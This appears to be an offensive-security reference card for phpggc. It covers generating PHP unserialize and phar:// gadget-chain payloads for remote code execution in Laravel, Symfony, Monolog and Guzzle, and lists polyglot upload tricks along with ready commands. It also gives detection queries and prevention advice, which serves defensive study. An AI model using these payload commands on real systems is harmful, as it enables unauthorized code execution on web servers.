name: phpggc - PHP Object Injection Gadget Chains
description: phpggc generates PHP object-injection (unserialize) payloads using gadget chains in popular frameworks and libraries (Laravel, Symfony, Monolog, Guzzle, Doctrine, WordPress). When an app calls unserialize() on attacker data, crafted objects trigger magic methods (__wakeup, __destruct, __toString) that chain into file writes or command execution. phpggc also builds phar archives to exploit phar:// deserialization reached through file functions.
notes:
=== IDENTIFY A PHP UNSERIALIZE SINK ===
  # Serialized PHP looks like: O:4:"User":2:{...} (object) or a:2:{...} (array).
  # Sinks: unserialize($_GET/_POST/cookie), or file funcs reachable with phar:// (fopen/file_get_contents/getimagesize).

=== LIST AVAILABLE CHAINS ===
  phpggc -l                 # all chains
  phpggc -l laravel         # filter by framework
  phpggc -i Laravel/RCE1    # info/requirements for one chain

=== GENERATE A PAYLOAD ===
  phpggc Laravel/RCE1 system id
  phpggc Symfony/RCE4 exec "id"
  phpggc Monolog/RCE1 system "id"
  phpggc Guzzle/RCE1 system id
  # Base64 / URL encode for transport:
  phpggc -b Laravel/RCE1 system id       # base64
  phpggc -u Laravel/RCE1 system id       # url-encoded

=== PHAR DESERIALIZATION (file-function sinks, no unserialize call needed) ===
  # Build a polyglot phar whose metadata is the gadget, then reach it with a phar:// path.
  phpggc -p phar -o /tmp/evil.phar Monolog/RCE1 system id
  # Upload evil.phar (often as evil.gif), then trigger:
  #   file_get_contents("phar:///var/www/uploads/evil.gif")  -> deserializes metadata
  phpggc -pj phar -o evil.phar Monolog/RCE1 system id   # phar+jpeg polyglot

=== MAGIC METHODS THAT DRIVE THE CHAIN ===
  __wakeup()   fires on unserialize()
  __destruct() fires when the object is garbage-collected
  __toString() fires when the object is treated as a string

=== ALTERNATIVES ===
  Hand-craft objects when no framework chain fits (PHPGGC covers most)
  LFI phar:// wrapper card for the phar trigger mechanics

examples.label: Base64 Monolog payload for a cookie
Phar/jpeg polyglot for a file-function sink
examples.command: phpggc -pj phar -o evil.phar Monolog/RCE1 system id

recommended.note: Node.js serialization RCE, a sibling runtime.
Python pickle RCE, a sibling runtime.

defense.why_it_works: PHP unserialize() rebuilds arbitrary objects and runs their magic methods. Gadget chains in bundled libraries route __destruct/__wakeup into file writes or process execution. phar:// smuggles the same object graph through any file-system function, so even code that never calls unserialize() can be hit.
defense.prerequisites: A reachable unserialize() on user input, or a file function accepting a phar:// path plus a way to upload the phar; a library with a usable gadget chain in the codebase.
defense.impact: Remote code execution as the web server / PHP-FPM user.
defense.detection: [MITRE T1190] Requests with O:<n>: or a:<n>:{ serialized objects, or phar:// in parameters/uploaded file metadata; [MITRE T1059] php/php-fpm spawning sh/bash as children.
defense.artifacts: Apache/Nginx access logs with serialized blobs or phar:// strings; uploaded files whose trailing bytes contain __HALT_COMPILER() (phar signature); EDR process tree php-fpm -> sh.
defense.splunk_spl:
index=web (request_body="*phar://*" OR request_body="O:*:*{*" OR uri_query="*phar%3A%2F%2F*")
| table _time, src_ip, uri_path, request_body
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("php","php-fpm","php-cgi","httpd","nginx")
| where FileName in~ ("sh","bash","dash")
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
defense.prevention: Never unserialize() untrusted input; use json_decode for data. If unavoidable, pass allowed_classes=false. Validate uploaded file content and block phar:// via disable wrappers / PHP 8 phar read-only defaults; keep frameworks patched; run PHP-FPM least-privileged.

detections.name: PHP serialized object or phar:// in web request
detections.logic:
index=web (request_body="*phar://*" OR request_body="O:*:*{*" OR uri_query="*phar%3A%2F%2F*")
| stats count by src_ip, uri_path
| where count > 0
detections.false_positives: Apps that legitimately pass serialized session data in requests
detections.tuning: Focus on endpoints that accept serialized input or file paths; correlate with a php-fpm child shell
